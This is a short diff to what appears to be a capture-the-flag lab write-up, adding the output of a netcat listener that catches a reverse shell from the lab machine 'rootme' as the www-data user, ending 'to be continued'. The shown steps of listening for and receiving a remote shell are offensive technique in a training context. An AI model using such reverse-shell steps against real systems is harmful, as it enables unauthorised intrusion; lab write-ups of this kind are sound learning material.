@@ -87,6 +87,13 @@ Reverse shell 🐚 Upload
 
         root@ip-10-10-91-11:~# nc -lvnp 9999
         Listening on 0.0.0.0 9999
+        Connection received on 10.10.182.156 47768
+        Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+         13:31:12 up 17 min,  0 users,  load average: 0.00, 0.03, 0.09
+        USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+        uid=33(www-data) gid=33(www-data) groups=33(www-data)
+        /bin/sh: 0: can't access tty; job control turned off
+        $
 
 (to be continued)
 
